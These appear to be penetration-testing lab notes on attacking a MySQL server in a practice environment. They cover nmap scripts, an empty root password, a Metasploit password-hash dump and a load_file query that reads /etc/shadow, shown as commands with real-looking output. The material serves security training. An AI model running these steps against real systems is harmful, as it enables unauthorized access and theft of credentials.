# Recon Basics

# nmap scripts

```
root@attackdefense:~# nmap 192.130.97.3 -p 3306 --script=mysql-info          
Starting Nmap 7.70 ( https://nmap.org ) at 2023-11-25 22:35 UTC
Nmap scan report for target-1 (192.130.97.3)
Host is up (0.000032s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 49
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsLoadDataLocal, Support41Auth, ODBCClient, DontAllowDatabaseTableColumn, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: U"G"q5Qx,nf5q]]>Z-nc
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:82:61:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds

root@attackdefense:~# nmap 192.130.97.3 -p 3306 --script=mysql-empty-password
Starting Nmap 7.70 ( https://nmap.org ) at 2023-11-25 22:34 UTC
Nmap scan report for target-1 (192.130.97.3)
Host is up (0.000045s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:82:61:03 (Unknown)
```

# nmap mysql audit

```
root@attackdefense:~# nmap 192.130.97.3 -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-11-25 22:42 UTC
Nmap scan report for target-1 (192.130.97.3)
Host is up (0.000067s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
MAC Address: 02:42:C0:82:61:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

# Connect as root

```
root@attackdefense:~# mysql -h 192.130.97.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
```

# Metasploit hashdump

```
msf5 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS    192.130.97.3     yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads
   USERNAME  root             no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_hashdump) > exploit

[+] 192.130.97.3:3306     - Saving HashString as Loot: root:
[+] 192.130.97.3:3306     - Saving HashString as Loot: root:
[+] 192.130.97.3:3306     - Saving HashString as Loot: root:
[+] 192.130.97.3:3306     - Saving HashString as Loot: root:
[+] 192.130.97.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.130.97.3:3306     - Saving HashString as Loot: root:
[+] 192.130.97.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.130.97.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.130.97.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.130.97.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.130.97.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.130.97.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.130.97.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# MySQL file access

```
MySQL [(none)]> select load_file("/etc/shadow");
+-----------------------+
| load_file("/etc/shadow")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+-----------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
```
